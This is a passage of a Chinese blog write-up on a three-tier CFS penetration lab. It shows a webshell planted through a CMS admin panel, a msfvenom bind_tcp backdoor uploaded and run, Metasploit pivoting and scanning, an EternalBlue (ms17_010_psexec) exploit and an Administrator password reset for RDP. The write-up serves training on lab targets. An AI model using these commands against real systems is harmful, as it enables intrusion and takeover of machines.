+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS31.png" alt><br>8、找到我们想要的了，登陆后台，看看有哪些功能<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS32.png" alt><br>9、后台里面有文件上传的地方，有编辑主页文件的地方，为了方便，我们直接把一句话写入网站文件中<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS33.png" alt><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS34.png" alt><br>10、来到标签页，可以看到一句话生效了，接下里在SocksCap中打开蚁剑，利用蚁剑连接，注意SocksCap设置好代理<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS35.png" alt><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS36.png" alt></p>
+<h2 id="b、设置代理-1"><a href="#b、设置代理-1" class="headerlink" title="b、设置代理"></a>b、设置代理</h2><p>1、蚁剑中可以看到这是一个64位的linux系统，据此信息在MSF中生成后门</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=4321 -f elf &gt; shell2.elf</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS37.png" alt><br>2、利用蚁剑将shell2.elf上传到Target2并开启监听</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(www:/www/wwwroot/upload) $ chmod 777 shell2.elf</span><br><span class="line">(www:/www/wwwroot/upload) $ ./shell2.elf</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS38.png" alt></p>
+<p>3、在MSF中开启EXP，与Target2建立连接，这里需要注意，上一次代理使用的reverse_tcp是MSF作为监听，让Target1连到我们，而这次代理使用的bind_tcp是Target2作为监听，我们需要连到Target2，这个逻辑正好是相反的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 exploit(multi/handler) &gt; set payload linux/x64/meterpreter/bind_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; set RHOST 192.168.22.22</span><br><span class="line">msf5 exploit(multi/handler) &gt; set LPORT 4321</span><br><span class="line">msf5 exploit(multi/handler) &gt; options</span><br><span class="line">msf5 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS39.png" alt><br>4、与之前一样，我们添加Target3的路由，这里就不用设置代理了，直接添加路由即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 192.168.33.0/24</span><br><span class="line">run autoroute -p</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS40.png" alt><br>5、尝试扫描Target3</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# proxychains4 nmap -Pn -sT 192.168.33.33</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS43.png" alt></p>
+<h1 id="0x03-Target3"><a href="#0x03-Target3" class="headerlink" title="0x03 Target3"></a>0x03 Target3</h1><h2 id="a、获取shell-2"><a href="#a、获取shell-2" class="headerlink" title="a、获取shell"></a>a、获取shell</h2><p>1、从扫描的结果来看，不难看出这是一个开放着445、3389端口的Windows系统，那就先用永恒之蓝攻击试试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/windows/smb/ms17_010_psexec</span><br><span class="line">msf5 exploit(windows/smb/ms17_010_psexec) &gt; set payload windows/meterpreter/bind_tcp</span><br><span class="line">msf5 exploit(windows/smb/ms17_010_psexec) &gt; set RHOST 192.168.33.33</span><br><span class="line">msf5 exploit(windows/smb/ms17_010_psexec) &gt; options</span><br><span class="line">msf5 exploit(windows/smb/ms17_010_psexec) &gt; run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS44.png" alt></p>
+<p>2、查看账户，直接修改账户密码，利用3389连接，注意要在SocksCap中运行连接远程桌面程序</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">C:\Windows\system32&gt;net user</span><br><span class="line">C:\Windows\system32&gt;net user Administrator 123</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS45.png" alt><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS46.png" alt></p>
+<h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>到目前为止，三台靶机都已经拿下，这里推荐读者能够自己亲手尝试，找到里面的flag，其中所有flag的找寻方式，会在我的公众号“TeamsSix”推送，这里只讲述拿下三台靶机的方法。<br>这次的练习耗费了自己的大量时间，从靶场搭建到获取到第三层靶机的shell，这其中碰到的一些问题及我自己踩过的一些坑记录在下面：</p>
+<p>1、蚁剑中查看一些文件会提示权限不足，在meterpreter中可以正常查看<br>2、蚁剑中在Target2里执行命令或者查看文件时不时会失败，初步判断是因为本地网络代理的原因，多试几次就行，总有一次是成功的<br>3、MSF中Socks5代理模块使用总是失败，Socks4a模块使用成功<br>4、MSF中建立的会话总是自动断开，将会话连接的靶机上的防火墙关闭即可<br>5、MSF中ms17_010_eternalblue模块利用总是失败，ms17_010_psexec模块使用成功<br>6、meterpreter中查看文件的路径和Windows下文件的路径里的“/”是相反的<br>7、meterpreter中上传文件大小貌似有限制，文件上传到8M左右就会提示失败，因此需要将文件压缩成多个小文件进行上传，同时上传7-zip工具（该工具只有1M大小），再利用7-zip对其解压即可，当然此方法仅适用于Windows，linux上的方法可以自行谷歌</p>
+<blockquote>
+<p>参考文章：<br><a href="http://zerlong.com/512.html" target="_blank" rel="noopener">http://zerlong.com/512.html</a><br><a href="https://www.anquanke.com/post/id/170649" target="_blank" rel="noopener">https://www.anquanke.com/post/id/170649</a><br><a href="https://www.anquanke.com/post/id/164525" target="_blank" rel="noopener">https://www.anquanke.com/post/id/164525</a><br><a href="https://blog.csdn.net/qq_36711453/article/details/84977739" target="_blank" rel="noopener">https://blog.csdn.net/qq_36711453/article/details/84977739</a><br>这些文章在很大程度上帮助了我这个菜鸟，在这里向以上文章的作者表示感谢。</p>
+</blockquote>
+<blockquote>
+<p>更多信息欢迎关注我的公众号：TeamsSix<br>本文首发地址：<a href="https://www.anquanke.com/post/id/187908" target="_blank" rel="noopener">https://www.anquanke.com/post/id/187908</a></p>
+</blockquote>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/year/191021-211425.html">CFS三层靶机搭建及其内网渗透【附靶场环境】</a></p>
+        <p><span>文章作者:</span><a href="/" title="访问 Teams Six 的个人博客">Teams Six</a></p>
+        <p><span>发布时间:</span>2019年10月21日 - 21时14分</p>
+        <p><span>最后更新:</span>2019年10月21日 - 21时17分</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/year/191021-211425.html" title="CFS三层靶机搭建及其内网渗透【附靶场环境】">http://www.teamssix.com/year/191021-211425.html</a>
+            <span class="copy-path" data-clipboard-text="原文: http://www.teamssix.com/year/191021-211425.html　　作者: Teams Six" title></span>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target="_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+<nav id="article-nav">
+  
+  
+    <a href="/year/191014-090745.html" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">经过一场面试，我发现我还存在这些不足</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-环境搭建"><span class="toc-number">2.</span> <span class="toc-text">0x01 环境搭建</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-Target1"><span class="toc-number">3.</span> <span class="toc-text">0x02 Target1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#a、获取shell"><span class="toc-number">3.1.</span> <span class="toc-text">a、获取shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#b、设置代理"><span class="toc-number">3.2.</span> <span class="toc-text">b、设置代理</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-Target2"><span class="toc-number">4.</span> <span class="toc-text">0x03 Target2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#a、获取shell-1"><span class="toc-number">4.1.</span> <span class="toc-text">a、获取shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#b、设置代理-1"><span class="toc-number">4.2.</span> <span class="toc-text">b、设置代理</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-Target3"><span class="toc-number">5.</span> <span class="toc-text">0x03 Target3</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#a、获取shell-2"><span class="toc-number">5.1.</span> <span class="toc-text">a、获取shell</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-总结"><span class="toc-number">6.</span> <span class="toc-text">0x04 总结</span></a></li></ol>
+</div>
+<style>
+    .left-col .switch-btn {
+        display: none;
+    }
+    .left-col .switch-area {
+        display: none;
+    }
+</style>
+<input type="button" id="tocButton" value="隐藏目录" title="点击按钮隐藏或者显示文章目录">
+
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+            $(".switch-btn, .switch-area").fadeOut(300);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+            $(".switch-btn, .switch-area").fadeIn(500);
+        }
+    })
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+        $(".switch-btn, .switch-area").show();
+    }
+</script>
+
+
+
+
+
+
+    
+        <section id="comments">
+  <div id="disqus_thread"></div>
+    <script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+    var disqus_shortname = 'TeamsSix'; // required: replace example with your forum shortname
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+  </script>
+  <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</section>
+    
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        
+            <a href="/year/191014-090745.html" title="下一篇: 经过一场面试，我发现我还存在这些不足">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/year/191021-211425.html">CFS三层靶机搭建及其内网渗透【附靶场环境】</a></li><li class="post-list-item"><a class="post-list-link" href="/year/191014-090745.html">经过一场面试，我发现我还存在这些不足</a></li><li class="post-list-item"><a class="post-list-link" href="/year/191009-164624.html">【经验总结】VPS欠费后Hexo博客521无法访问</a></li><li class="post-list-item"><a class="post-list-link" href="/year/190925-114420.html">【CTF】记录一次CTF比赛的Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/year/190720-121144.html">【经验总结】记录一次Docker下安装CTFd的错误</a></li><li class="post-list-item"><a class="post-list-link" href="/year/190717-124041.html">分享一张超详细的渗透测试导图</a></li><li class="post-list-item"><a class="post-list-link" href="/year/190715-102622.html">【工具】批量网站CMS指纹识别</a></li><li class="post-list-item"><a class="post-list-link" href="/year/190709-202131.html">【经验总结】小白挖洞十天经验分享</a></li><li class="post-list-item"><a class="post-list-link" href="/year/190703-221956.html">【渗透实例】记录一次XSS渗透过程</a></li><li class="post-list-item"><a class="post-list-link" href="/year/190619-202702.html">【Python实例】让Python告诉你B站观影指南</a></li><li class="post-list-item"><a class="post-list-link" href="/year/190618-225704.html">【Python实例】让Python告诉你当前最火的电影是什么</a></li><li class="post-list-item"><a class="post-list-link" href="/year/190615-013724.html">【漏洞复现 CVE 2019-0708】17年的勒索病毒又双叕卷土重来了？</a></li><li class="post-list-item"><a class="post-list-link" href="/year/190614-134948.html">对于连接ssh时连时断的解决方法</a></li><li class="post-list-item"><a class="post-list-link" href="/year/190614-111512.html">hexo自适应BiliBili视频大小的解决方案</a></li><li class="post-list-item"><a class="post-list-link" href="/year/190613-191825.html">【Python实例】批量下载斗罗大陆高清视频</a></li><li class="post-list-item"><a class="post-list-link" href="/year/191612-123700.html">为自定义域名的Hexo博客升级到Https网站</a></li></ul>
+    
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+    <script>
+        $(".post-list").addClass("toc-article");
+        // $(".post-list-item a").attr("target","_blank");
+        $("#post-nav-button > a:nth-child(2)").click(function() {
+            $(".fa-bars, .fa-times").toggle();
+            $(".post-list").toggle(300);
+            if ($(".toc").length > 0) {
+                $("#toc, #tocButton").toggle(200, function() {
+                    if ($(".switch-area").is(":visible")) {
+                        $("#toc, .switch-btn, .switch-area").toggle();
+                        $("#tocButton").attr("value", valueHide);
+                        }
+                    })
+            }
+            else {
+                $(".switch-btn, .switch-area").fadeToggle(300);
+            }
+        })
+    </script>
+
+
+
+
+    <script>
+        
+</script></div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2019 Teams Six
+            </div>
+            <div class="footer-right">
+            欢迎关注本站对应公众号：TeamsSix
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style="display:none">
+                        <span id="site-visit">本站到访数: 
+                            <span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>, </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style="display:none">
+                        <span id="page-visit">本页阅读量: 
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+
+</footer>
+
+    </div>
+    
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+<script src="/js/main.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var backgroundnum = 1;
+            var backgroundimg = "url(/background/bg-" + backgroundnum +".jpg)";
+            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+        })
+    </script>
+
+
+<!-- Google Analytics -->
+<script type="text/javascript">
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-150271429-1', 'auto');
+ga('send', 'pageview');
+
+</script>
+<!-- End Google Analytics -->
+
+
+
+	<script>
+	var _hmt = _hmt || [];
+	(function() {
+	  var hm = document.createElement("script");
+	  hm.src = "//hm.baidu.com/hm.js?8bab20886c3df9c0d832a9b6aee45740";
+	  var s = document.getElementsByTagName("script")[0]; 
+	  s.parentNode.insertBefore(hm, s);
+	})();
+	</script>
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    $(document).ready(function() {
+        if ($("#comments").length < 1) {
+            $("#scroll > a:nth-child(2)").hide();
+        };
+    })
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+
+  </div>
+</body>
+</html>
